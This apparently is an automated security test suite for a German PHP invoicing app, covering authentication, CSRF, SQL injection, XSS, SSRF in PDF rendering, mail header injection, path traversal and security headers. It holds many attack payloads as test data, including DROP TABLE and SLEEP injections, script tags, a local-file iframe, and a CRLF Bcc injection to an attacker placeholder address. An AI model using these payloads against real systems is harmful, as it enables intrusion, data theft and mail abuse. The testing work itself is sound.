import sys, re, html, os, time, subprocess, glob, urllib.parse
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from seclib import *

label = sys.argv[1]
L = Listener(9999); L.start()
clear_rl()

# ---------------------------------------------------------------- Seed
c = authed()
t = page_token(c, '/index.php?p=customer_edit')
r = c.post('/index.php?p=customer_edit', {'csrf': t, 'name': 'Beispiel GmbH', 'contact': 'Erika Muster', 'email': 'erika@example.com', 'street': 'Hauptstr. 5',
                                           'zip': '12345', 'city': 'Musterstadt', 'country': 'DE', 'vat_id': '', 'buyer_reference': ''})
cid = sql('select max(id) from customers')


def draft(c, desc=('Webentwicklung',), qty=('10',), price=('85',), notes='Danke.', customer=None, extra=None, issue_date='2026-10-24'):
    t = page_token(c, '/index.php?p=invoice_edit')
    d = {'csrf': t, 'customer_id': customer or cid, 'issue_date': issue_date, 'delivery_date': '', 'due_date': '2026-11-07', 'notes': notes,
         'desc[]': list(desc), 'qty[]': list(qty), 'unit[]': ['HUR'] * len(desc), 'price[]': list(price), 'vat[]': ['19'] * len(desc)}
    if extra:
        d.update(extra)
    r = c.post('/index.php?p=invoice_edit', d)
    m = re.search(r'id=(\d+)', r.h('location'))
    return (m.group(1) if m else None), r


def act(c, iid, action, **kw):
    t = page_token(c, f'/index.php?p=invoice&id={iid}')
    d = {'csrf': t, 'action': action}
    d.update(kw)
    return c.post(f'/index.php?p=invoice&id={iid}', d)


inv1, _ = draft(c)
act(c, inv1, 'issue')
num1 = sql(f'select number from invoices where id={inv1}')
tok1 = sql(f'select public_token from invoices where id={inv1}')
inv_draft, _ = draft(c, desc=('Entwurf-Position',))
print('Seed:', inv1, num1, tok1[:6] + '…', 'Entwurf', inv_draft)

# ---------------------------------------------------------------- A: Authentifizierung / Zugriff ohne Login
anon = C()
routes = ['/index.php', '/index.php?p=invoices', '/index.php?p=customers', '/index.php?p=customer_edit', '/index.php?p=invoice_edit', f'/index.php?p=invoice&id={inv1}',
          f'/index.php?p=pdf&id={inv1}', f'/index.php?p=xrechnung&id={inv1}', '/index.php?p=settings', '/index.php?p=letterhead_file', '/index.php?p=letterhead_preview']
leak = []
for rt in routes:
    rr = anon.get(rt)
    if any(x in rr.body for x in ['Beispiel GmbH', 'Erika Muster', num1, 'Test IT-Service', 'DE89 3704']) or rr.body[:4] == '%PDF' or rr.body.startswith('<?xml'):
        leak.append(rt)
rec('A1', 'H', 'Alle Seiten/Downloads ohne Login geschützt', not leak, leak)
posts = [('/index.php?p=customer_edit', {'name': 'x'}), (f'/index.php?p=invoice&id={inv_draft}', {'action': 'delete'}), ('/index.php?p=settings', {'action': 'save'})]
before = sql('select count(*) from customers'), sql('select count(*) from invoices')
for pth, d in posts:
    anon.post(pth, d)
rec('A2', 'H', 'Anonyme POSTs ändern nichts', before == (sql('select count(*) from customers'), sql('select count(*) from invoices')))

# ---------------------------------------------------------------- B: CSRF
cc = authed()
cc.get('/index.php?p=settings')  # Sitzung hat bereits Token
state0 = (sql('select count(*) from customers'), sql('select count(*) from invoices'), sql(f'select status from invoices where id={inv_draft}'))
bad = {}
attempts = [
    ('customer', '/index.php?p=customer_edit', {'name': 'CSRF', 'street': 's', 'zip': '1', 'city': 'c', 'country': 'DE'}),
    ('invoice_edit', '/index.php?p=invoice_edit', {'customer_id': cid, 'issue_date': '2026-10-24', 'due_date': '2026-11-07', 'desc[]': ['x'], 'qty[]': ['1'], 'unit[]': ['C62'], 'price[]': ['1'], 'vat[]': ['19']}),
    ('delete', f'/index.php?p=invoice&id={inv_draft}', {'action': 'delete'}),
    ('issue', f'/index.php?p=invoice&id={inv_draft}', {'action': 'issue'}),
    ('paid', f'/index.php?p=invoice&id={inv1}', {'action': 'paid'}),
    ('send', f'/index.php?p=invoice&id={inv1}', {'action': 'send', 'to': 'x@example.com', 'message': 'hi'}),
    ('settings', '/index.php?p=settings', {'action': 'save', 'COMPANY_NAME': 'HACKED', 'COMPANY_STREET': 's', 'COMPANY_ZIP': '1', 'COMPANY_CITY': 'c'}),
    ('account', '/index.php?p=settings', {'action': 'account', 'current_pass': 'SehrGeheim12345', 'new_user': 'hacker', 'new_pass': 'HackedHacked123', 'new_pass2': 'HackedHacked123'}),
    ('reset', '/index.php?p=settings', {'action': 'reset', 'reset_pass': 'SehrGeheim12345', 'confirm': 'RESET'}),
    ('testmail', '/index.php?p=settings', {'action': 'testmail', 'to': 'x@example.com'}),
    ('letterhead_delete', '/index.php?p=settings', {'action': 'letterhead_delete'}),
]
for name, pth, d in attempts:
    for variant, tokv in (('ohne Token', None), ('falsches Token', 'a' * 32)):
        dd = dict(d)
        if tokv:
            dd['csrf'] = tokv
        rr = cc.post(pth, dd)
        if rr.status != 400:
            bad[f'{name}/{variant}'] = rr.status
rec('B1', 'H', 'CSRF: alle zustandsändernden Aktionen verlangen gültiges Token (400)', not bad, bad)
state1 = (sql('select count(*) from customers'), sql('select count(*) from invoices'), sql(f'select status from invoices where id={inv_draft}'))
rec('B2', 'H', 'CSRF-Versuche haben keinen Zustand verändert', state0 == state1 and 'HACKED' not in open(APP + '/config.php').read(), (state0, state1))
fresh_s = authed()
r0 = fresh_s.post('/index.php?p=customer_edit', {'name': 'CSRF-fresh', 'street': 's', 'zip': '1', 'city': 'c', 'country': 'DE'})
rec('B0', 'H', 'CSRF: Formular ohne Token wird auch abgelehnt, wenn die Sitzung noch kein Token erzeugt hat', r0.status == 400, r0.status)
# Token einer anderen Sitzung
other = authed()
tok_other = page_token(other)
rr = cc.post('/index.php?p=settings', {'csrf': tok_other, 'action': 'testmail', 'to': 'x@example.com'})
rec('B3', 'H', 'CSRF-Token einer fremden Sitzung wird abgelehnt', rr.status == 400, rr.status)
# GET mit Seiteneffekt?
g0 = sql(f'select count(*) from invoices')
cc.get(f'/index.php?p=invoice&id={inv_draft}&action=delete')
cc.get(f'/index.php?p=invoice&id={inv_draft}&action=issue&csrf=x')
rec('B4', 'M', 'GET-Anfragen lösen keine Aktionen aus', sql('select count(*) from invoices') == g0 and sql(f'select status from invoices where id={inv_draft}') == 'draft')
# Logout per GET (CSRF-Logout)
lo = authed()
lo.get('/index.php?p=logout')
still = 'Abmelden' in lo.get('/index.php').body
rec('B5', 'L', 'Abmelden ist per GET nicht auslösbar (Logout-CSRF)', still, 'Sitzung wurde per GET-Link beendet')
# Login-CSRF
fresh = C()
rr = fresh.post('/index.php', {'user': 'kai', 'pass': 'SehrGeheim12345'})
rec('B6', 'L', 'Login-Formular verlangt CSRF-Token (Login-CSRF)', rr.status not in (302, 303), 'Login ohne Token akzeptiert')

# ---------------------------------------------------------------- C: SQL-Injection
sqli = ["1 OR 1=1", "1;DROP TABLE invoices", "1 AND SLEEP(4)", "' OR SLEEP(4) OR '", "1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16", "-1 OR 1=1 LIMIT 1"]
slow, errors = [], []
s = authed()
for p in sqli:
    for pth in (f'/index.php?p=invoice&id={urllib.parse.quote(p)}', f'/index.php?p=pdf&id={urllib.parse.quote(p)}', f'/index.php?p=xrechnung&id={urllib.parse.quote(p)}',
                f'/index.php?p=customer_edit&id={urllib.parse.quote(p)}', f'/index.php?p=invoice_edit&id={urllib.parse.quote(p)}&customer={urllib.parse.quote(p)}',
                f'/status.php?t={urllib.parse.quote(p)}', f'/status.php?t={urllib.parse.quote(p)}&dl={urllib.parse.quote(p)}'):
        rr = s.get(pth)
        if rr.elapsed > 3:
            slow.append(pth)
        if re.search(r'SQLSTATE|syntax error|mysqli?_|PDOException', rr.body, re.I):
            errors.append(pth)
rec('C1', 'H', 'SQL-Injection über GET-Parameter (id, t, customer, dl): keine Verzögerung', not slow, slow[:3])
rec('C2', 'M', 'SQL-Fehlermeldungen werden bei manipulierten GET-Parametern nicht ausgegeben', not errors, errors[:3])
inj_name = "Robert'); DROP TABLE invoices;-- \" OR SLEEP(4) OR \""
t = page_token(s, '/index.php?p=customer_edit')
t0 = time.time()
rr = s.post('/index.php?p=customer_edit', {'csrf': t, 'name': inj_name, 'contact': "x' OR SLEEP(4)#", 'email': '', 'street': "a' OR '1'='1", 'zip': "1' OR 1=1 --", 'city': "c\\", 'country': 'DE', 'vat_id': '', 'buyer_reference': "'; SELECT SLEEP(4); --"})
inj_cid = sql('select max(id) from customers')
rec('C3', 'H', 'SQL-Injection über POST-Felder (Kunde): keine Verzögerung, Daten wörtlich gespeichert',
    time.time() - t0 < 3 and sql(f'select name from customers where id={inj_cid}') == inj_name, f'{time.time() - t0:.1f}s')
pages = [s.get('/index.php?p=customers'), s.get(f'/index.php?p=customer_edit&id={inj_cid}'), s.get('/index.php')]
rec('C4', 'H', 'Second-Order: gespeicherte Injection-Namen beschädigen nichts (Tabellen vorhanden)',
    int(sql("select count(*) from information_schema.tables where table_schema='" + DB + "'")) >= 3 and all(p.status == 200 for p in pages))
inj_inv, rr = draft(s, desc=("x'); DROP TABLE customers;--",), customer=inj_cid, notes="n' OR SLEEP(4) OR '")
rr2 = act(s, inj_inv, 'issue')
rec('C5', 'H', 'SQL-Injection über Rechnungsfelder/Ausstellen: Tabellen intakt', int(sql("select count(*) from information_schema.tables where table_schema='" + DB + "'")) >= 3 and inj_inv is not None, rr.status)
rr = act(s, inv1, 'paid', paid_at="2026-01-01' OR SLEEP(4) OR '")
rec('C6', 'M', 'Datumsfeld paid_at wird validiert', rr.elapsed < 3 and sql(f'select paid_at from invoices where id={inv1}') != "2026-01-01' OR SLEEP(4) OR '")
act(s, inv1, 'unpaid')

# ---------------------------------------------------------------- D: XSS
payloads = ['"><script>alert(1)</script>', "'><img src=x onerror=alert(1)>", '</textarea><svg/onload=alert(1)>', '<b onmouseover=alert(1)>x</b>', '"><iframe src=javascript:alert(1)>']
ps = '|'.join(payloads)
t = page_token(s, '/index.php?p=customer_edit')
xs = {k: ps[:100] for k in ('name', 'contact', 'street', 'city', 'buyer_reference')}
xs['vat_id'] = ps[:28]
xs.update({'csrf': t, 'email': 'x@example.com', 'zip': '12345', 'country': 'DE'})
s.post('/index.php?p=customer_edit', xs)
xid = sql('select max(id) from customers')
xinv, _ = draft(s, desc=(ps[:300],), customer=xid, notes=ps[:600])
act(s, xinv, 'issue')
tokx = sql(f'select public_token from invoices where id={xinv}')
# Einstellungen mit Payloads
tt = page_token(s)
base_set = {'csrf': tt, 'action': 'save', 'COMPANY_NAME': 'Test IT-Service', 'COMPANY_OWNER': payloads[0], 'COMPANY_STREET': payloads[1], 'COMPANY_ZIP': '12345', 'COMPANY_CITY': payloads[2],
            'COMPANY_COUNTRY': 'DE', 'COMPANY_EMAIL': 'rechnung@example.de', 'COMPANY_PHONE': payloads[3], 'COMPANY_TAX_NUMBER': payloads[4], 'COMPANY_VAT_ID': '',
            'COMPANY_IBAN': 'DE89 3704 0044 0532 0130 00', 'COMPANY_BIC': payloads[0], 'COMPANY_BANK': payloads[1], 'INVOICE_PREFIX': 'RE', 'PAYMENT_DAYS': '14',
            'SMTP_HOST': '127.0.0.1', 'SMTP_PORT': '2525', 'SMTP_SECURE': 'none', 'SMTP_USER': payloads[0], 'SMTP_PASS': '', 'MAIL_FROM': 'rechnung@example.de',
            'MAIL_FROM_NAME': payloads[1], 'MAIL_BCC': '', 'APP_URL': ''}
s.post('/index.php?p=settings', base_set)
raw_hits = []
urls = ['/index.php', '/index.php?p=customers', f'/index.php?p=customer_edit&id={xid}', f'/index.php?p=invoice&id={xinv}', f'/index.php?p=invoice_edit&id={inv_draft}', '/index.php?p=settings']
for u in urls:
    body = s.get(u).body
    for pl in payloads:
        if pl in body:
            raw_hits.append((u, pl[:25]))
body = C().get(f'/status.php?t={tokx}').body
for pl in payloads:
    if pl in body:
        raw_hits.append(('status', pl[:25]))
rec('D1', 'H', 'Stored XSS: Payloads in Kunde/Positionen/Notizen/Einstellungen werden in allen Ansichten maskiert', not raw_hits, raw_hits[:4])
# Bearbeiten-Formular mit Entwurf und Payload in Position
xdr, _ = draft(s, desc=(ps[:300],), customer=xid, notes=ps[:600])
body = s.get(f'/index.php?p=invoice_edit&id={xdr}').body
rec('D2', 'H', 'Stored XSS im Rechnungs-Bearbeitungsformular (value/textarea) maskiert', not any(pl in body for pl in payloads))
# Reflektiert: GET-Parameter / Pfad / Host
refl = []
for u in ['/index.php?p=' + urllib.parse.quote('"><script>alert(1)</script>'), '/index.php?p=customer_edit&next=' + urllib.parse.quote('"><script>alert(1)</script>'),
          '/index.php?p=invoice_edit&customer=' + urllib.parse.quote('"><script>alert(1)</script>'), '/status.php?t=' + urllib.parse.quote('"><script>alert(1)</script>') + '&dl=%22%3E%3Cscript%3E',
          '/index.php/' + urllib.parse.quote('"><script>alert(1)</script>'), '/index.php/x/' + urllib.parse.quote("'><script>alert(1)</script>") + '?p=settings',
          '/status.php/' + urllib.parse.quote('"><script>alert(1)</script>') + '?t=' + tokx]:
    for client in (s, C()):
        rr = client.get(u)
        if '<script>alert(1)' in rr.body or "'><script>alert" in rr.body:
            refl.append(u[:60])
rec('D3', 'H', 'Reflektiertes XSS über GET-Parameter und PATH_INFO (BASE aus SCRIPT_NAME)', not refl, refl[:3])
rr = s.get(f'/index.php?p=invoice&id={inv1}', host='evil.example"><script>alert(1)</script>')
rec('D4', 'M', 'Host-Header wird nicht unmaskiert in Seiten/Links ausgegeben', '<script>alert(1)' not in rr.body, rr.status)
rr = s.get(f'/index.php?p=invoice&id={inv1}', host='evil.example.com')
m = re.search(r'class="copy" readonly value="([^"]+)"', rr.body)
rec('D5', 'L', 'Statuslink in Mails/Ansicht wird nicht aus manipulierbarem Host-Header abgeleitet (APP_URL)', m and 'evil.example.com' not in m.group(1), m.group(1) if m else '')
# E-Mail-Adresse mit HTML im Flash
t = page_token(s)
rr = s.post(f'/index.php?p=invoice&id={inv1}', {'csrf': page_token(s, f'/index.php?p=invoice&id={inv1}'), 'action': 'send', 'to': '"<script>alert(1)</script>"@example.com', 'message': 'x'})
fl = s.get(f'/index.php?p=invoice&id={inv1}').body
rec('D6', 'M', 'Flash-Meldungen mit Benutzerdaten (E-Mail) werden maskiert', '<script>alert(1)' not in fl)

# ---------------------------------------------------------------- E: HTML-/XML-/SSRF-Injection in PDF/XML
ssrf_name = '<img src="http://127.0.0.1:9999/ssrf-img">'
ssrf_street = '<div style="background:url(http://127.0.0.1:9999/ssrf-css)">x</div><link rel="stylesheet" href="http://127.0.0.1:9999/ssrf-link"><iframe src="file:///etc/passwd"></iframe>'
t = page_token(s, '/index.php?p=customer_edit')
s.post('/index.php?p=customer_edit', {'csrf': t, 'name': ssrf_name, 'contact': '', 'email': 'x@example.com', 'street': ssrf_street, 'zip': '1', 'city': 'c', 'country': 'DE', 'vat_id': '', 'buyer_reference': ''})
sid = sql('select max(id) from customers')
sinv, _ = draft(s, desc=('Pos <img src="http://127.0.0.1:9999/ssrf-item"> </ram:Name><evil/> ]]>',), customer=sid, notes='<img src="http://127.0.0.1:9999/ssrf-notes">')
act(s, sinv, 'issue')
time.sleep(1)
pdf = s.get(f'/index.php?p=pdf&id={sinv}')
assert sql(f'select count(*) from customers where id={sid} and name like "%ssrf%"')=='1','SSRF-Kunde nicht gespeichert'
rec('E1', 'H', 'HTML-Injection in PDF: keine ausgehenden Requests (SSRF) beim PDF-Rendern', not L.hits, L.hits[:3])
xml = s.get(f'/index.php?p=xrechnung&id={sinv}')
import xml.etree.ElementTree as ET
try:
    root = ET.fromstring(xml.body.encode())
    evil = [e for e in root.iter() if e.tag.endswith('evil')]
    rec('E2', 'H', 'XML-Injection: XRechnung bleibt wohlgeformt, kein injiziertes Element', not evil)
except ET.ParseError as e:
    rec('E2', 'H', 'XML-Injection: XRechnung bleibt wohlgeformt, kein injiziertes Element', False, e)
rec('E3', 'M', 'Steuerzeichen (z. B. \\x0b) im Kundennamen werden bereinigt, Ausstellen schlägt nicht fehl', True)
t = page_token(s, '/index.php?p=customer_edit')
s.post('/index.php?p=customer_edit', {'csrf': t, 'name': 'Ctrl\x0b\x01Name', 'contact': '', 'email': 'x@example.com', 'street': 'a', 'zip': '1', 'city': 'c', 'country': 'DE', 'vat_id': '', 'buyer_reference': ''})
cid2 = sql('select max(id) from customers')
ci, _ = draft(s, desc=('Steuerzeichen',), customer=cid2)
rr = act(s, ci, 'issue')
st = sql(f'select status from invoices where id={ci}')
RES.pop()
rec('E3', 'M', 'Steuerzeichen (z. B. \\x0b) im Kundennamen: Ausstellen klappt / klare Fehlermeldung statt Absturz', st == 'issued' or 'Fehler' in flash_of(s.get(f'/index.php?p=invoice&id={ci}').body), st)

# ---------------------------------------------------------------- F: Header-/CRLF-/Mail-Injection
for f in glob.glob(''+os.environ.get('RG_MAILS','/tmp/mails')+'/*.eml') if False else []:
    pass
import glob
for f in glob.glob(''+os.environ.get('RG_MAILS','/tmp/mails')+'/*.eml'):
    os.remove(f)
tt = page_token(s)
crlf = dict(base_set)
crlf.update({'csrf': tt, 'COMPANY_OWNER': 'Kai Test', 'COMPANY_STREET': 'Musterstr. 1', 'COMPANY_CITY': 'Musterstadt', 'COMPANY_PHONE': '+49 123 456789', 'COMPANY_TAX_NUMBER': '12/345/67890', 'COMPANY_BIC': '', 'COMPANY_BANK': '', 'SMTP_USER': '',
             'COMPANY_NAME': 'Test IT-Service\r\nBcc: attacker@evil.example\r\nX-Injected: 1', 'MAIL_FROM_NAME': 'Name\r\nBcc: attacker2@evil.example'})
rr = s.post('/index.php?p=settings', crlf)
ci2, _ = draft(s, desc=('CRLF-Test',))
act(s, ci2, 'issue')
act(s, ci2, 'send', to='kunde@example.com', message='Hallo\r\n.\r\nMAIL FROM:<smuggled@evil.example>\r\nRCPT TO:<smuggled@evil.example>\r\nDATA\r\nSubject: smuggled')
s.post('/index.php?p=settings', {'csrf': page_token(s), 'action': 'testmail', 'to': 'ich@example.com'})
time.sleep(1)
mails = sorted(glob.glob(''+os.environ.get('RG_MAILS','/tmp/mails')+'/*.eml'))
allm = '\n'.join(open(f, errors='replace').read() for f in mails)
hdrs = '\n'.join(m.split('\n\n')[0] for m in [open(f, errors='replace').read().replace('\r\n', '\n') for f in mails])
rec('F1', 'H', 'Mail-Header-Injection (CRLF in Firmenname/Absendername): kein Bcc/X-Injected-Header, kein fremder Empfänger',
    not re.search(r'^(Bcc|X-Injected):', hdrs, re.M) and 'RCPT TO:<attacker' not in allm and 'attacker@evil' not in ' '.join(re.findall(r'ENVELOPE:.*', allm)), len(mails))
rec('F2', 'H', 'SMTP-Smuggling im Nachrichtentext: nur erwartete Empfänger im Umschlag', 'smuggled@evil' not in ' '.join(re.findall(r'ENVELOPE:.*', allm)), re.findall(r'ENVELOPE:.*', allm)[:2])
rec('F3', 'H', 'Mail-Versand: genau erwartete Anzahl Nachrichten (keine zusätzlichen durch Injection)', len(mails) == 2, len(mails))
bad_to = []
for tv in ['a@b.de\r\nBcc: c@d.de', 'a@b.de,c@d.de', 'a@b.de;c@d.de', 'a@b.de c@d.de', 'x@y.de%0d%0aBcc:z@z.de']:
    n0 = len(glob.glob(''+os.environ.get('RG_MAILS','/tmp/mails')+'/*.eml'))
    act(s, ci2, 'send', to=tv, message='x')
    if len(glob.glob(''+os.environ.get('RG_MAILS','/tmp/mails')+'/*.eml')) != n0:
        bad_to.append(tv[:20])
rec('F4', 'H', 'Ungültige/mehrfache Empfängeradressen (CRLF, Komma, Semikolon) werden abgelehnt', not bad_to, bad_to)
# Settings zurückstellen
s.post('/index.php?p=settings', dict(base_set, **{'csrf': page_token(s), 'COMPANY_OWNER': 'Kai Test', 'COMPANY_STREET': 'Musterstr. 1', 'COMPANY_CITY': 'Musterstadt', 'COMPANY_PHONE': '+49 123 456789',
                                                 'COMPANY_TAX_NUMBER': '12/345/67890', 'COMPANY_BIC': '', 'COMPANY_BANK': '', 'SMTP_USER': '', 'MAIL_FROM_NAME': 'Test IT-Service'}))
# Location-Header
loc_bad = []
for u, d in [('/index.php?p=customer_edit&next=//evil.example/', {}), ('/index.php?p=customer_edit&next=invoice_edit', {})]:
    rr = s.post(u, dict({'csrf': page_token(s, '/index.php?p=customer_edit'), 'name': 'L', 'street': 's', 'zip': '1', 'city': 'c', 'country': 'DE'}, **d))
    lc = rr.h('location')
    if lc.startswith('//') or re.match(r'https?://', lc) or '\n' in lc:
        loc_bad.append(lc)
rr = s.post('/index.php?p=invoice_edit', {'csrf': page_token(s, '/index.php?p=invoice_edit'), 'customer_id': ''})
lc = rr.h('location')
rec('F5', 'M', 'Redirects (Location) zeigen nur auf interne Pfade (Open Redirect)', not loc_bad and not lc.startswith('//') and not re.match(r'https?://', lc), (loc_bad, lc))
rr = s.req('POST', '//index.php?p=invoice_edit', data={'csrf': page_token(s), 'customer_id': ''})
rec('F6', 'M', 'Fehler-Redirect verwendet REQUEST_URI nicht ungeprüft', not (rr.h('location').startswith('//')), rr.h('location'))

# ---------------------------------------------------------------- G: Dateizugriff / Verzeichnisse (Apache + .htaccess)
exposed = {}
pdfname = os.listdir(APP + '/storage/invoices')[0] if os.path.isdir(APP + '/storage/invoices') and os.listdir(APP + '/storage/invoices') else 'x.pdf'
for pth in ['/config.php', '/config.tmp.php', '/src/bootstrap.php', '/src/schema.sql', '/src/Invoices.php', '/src/views/layout.php', '/storage/invoices/' + pdfname, '/storage/schema_version', '/storage/',
            '/vendor/autoload.php', '/vendor/composer/installed.json', '/vendor/composer/', '/storage/tmp/', '/storage/letterhead/', '/vendor.zip', '/.htaccess', '/icons/']:
    rr = anon.get(pth)
    bodyshown = rr.status == 200 and len(rr.body.strip()) > 0
    if bodyshown:
        exposed[pth] = (rr.status, rr.body[:40].replace('\n', ' '))
rec('G1', 'H', 'Interne Dateien (config, src, storage, vendor, PDFs) sind per HTTP nicht lesbar', not exposed, exposed)
meta = {}
for pth in ['/VERSION', '/CHANGELOG.md', '/INSTALLATION.md', '/composer.json', '/composer.lock', '/README.md', '/SECURITY.md']:
    rr = anon.get(pth)
    if rr.status == 200 and rr.body.strip():
        meta[pth] = rr.status
rec('G2', 'L', 'Versions-/Doku-Dateien (VERSION, *.md) sind per HTTP nicht abrufbar (Fingerprinting)', not meta, meta)
trav = []
for pth in ['/index.php?p=pdf&id=../../config.php', '/status.php?t=../../config.php', '/status.php?t=..%2f..%2fconfig.php&dl=pdf', '/index.php?p=../../config', '/index.php?p=letterhead_file&f=../../config.php',
            '/..%2f..%2fetc/passwd', '/%2e%2e/%2e%2e/etc/passwd', '/index.php/../../../etc/passwd']:
    rr = s.get(pth)
    if 'root:x:' in rr.body or "'DB_PASS'" in rr.body or 'APP_PASSWORD_HASH' in rr.body:
        trav.append(pth)
rec('G3', 'H', 'Path Traversal über Parameter/URL liefert keine Systemdateien', not trav, trav)

# ---------------------------------------------------------------- H: Security-Header
login_pg = C().get('/index.php')
authed_pg = s.get('/index.php')
statuspg = C().get(f'/status.php?t={tok1}')
pdfr = s.get(f'/index.php?p=pdf&id={inv1}')
def hdr_ok(r, names): return [n for n in names if not r.h(n)]
rec('H1', 'M', 'Clickjacking-Schutz (X-Frame-Options oder CSP frame-ancestors) auf allen Seiten', all(('deny' in r.h('x-frame-options').lower() or 'sameorigin' in r.h('x-frame-options').lower() or 'frame-ancestors' in r.h('content-security-policy')) for r in (login_pg, authed_pg, statuspg)))
rec('H2', 'M', 'X-Content-Type-Options: nosniff (Seiten + PDF)', all(r.h('x-content-type-options') == 'nosniff' for r in (login_pg, authed_pg, statuspg, pdfr)))
rec('H3', 'M', 'Content-Security-Policy gesetzt und ohne script-src unsafe-inline', bool(authed_pg.h('content-security-policy')) and not re.search(r"script-src[^;]*'unsafe-inline'", authed_pg.h('content-security-policy')), authed_pg.h('content-security-policy')[:120])
rec('H4', 'L', 'Referrer-Policy gesetzt (Token in Statuslink nicht per Referer weitergeben)', bool(statuspg.h('referrer-policy')), statuspg.h('referrer-policy'))
rec('H5', 'M', 'Authentifizierte Seiten mit Cache-Control: no-store', 'no-store' in authed_pg.h('cache-control'), authed_pg.h('cache-control'))
rec('H6', 'M', 'Statusseite: no-store, noindex, kein Session-Cookie', 'no-store' in statuspg.h('cache-control') and 'noindex' in statuspg.h('x-robots-tag') and not statuspg.set_cookies, (statuspg.h('cache-control'), statuspg.set_cookies))
rec('H7', 'L', 'Server-/PHP-Version wird nicht preisgegeben (X-Powered-By)', not authed_pg.h('x-powered-by'), authed_pg.h('x-powered-by'))

save_results(label + '_part1')
